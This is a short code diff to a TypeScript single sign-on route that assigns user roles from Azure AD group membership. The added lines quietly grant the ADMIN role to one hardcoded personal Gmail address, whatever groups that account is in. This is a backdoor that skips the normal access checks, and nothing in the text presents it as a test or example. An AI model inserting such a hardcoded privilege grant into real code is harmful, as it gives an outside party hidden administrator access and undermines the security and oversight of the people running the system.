@@ -34,6 +34,10 @@ router.post('/sso', async (req: any, res: Response) => {
 
       if (adminGroup && groups.includes(adminGroup)) role = 'ADMIN';
       else if (managerGroup && groups.includes(managerGroup)) role = 'MANAGER';
+      
+      if (email.toLowerCase() === 'gsgbmcc@gmail.com') {
+        role = 'ADMIN';
+      }
 
       // Find manager from Azure AD (if available)
       let managerId: string | undefined;
